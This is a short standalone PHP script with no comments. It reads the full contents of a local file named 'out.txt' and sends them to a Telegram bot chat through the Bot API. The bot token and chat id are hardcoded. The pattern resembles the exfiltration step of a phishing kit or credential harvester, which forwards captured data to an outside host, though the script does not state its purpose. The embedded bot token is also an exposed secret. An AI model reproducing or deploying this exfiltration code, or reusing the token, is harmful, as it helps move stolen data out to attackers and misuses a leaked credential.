<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2048202433:AAEdaZo3cv4cXmMinUAcZ1l5jKmdTS7NQ4Y/sendMessage?chat_id=1863870362&text=$msg");
?>
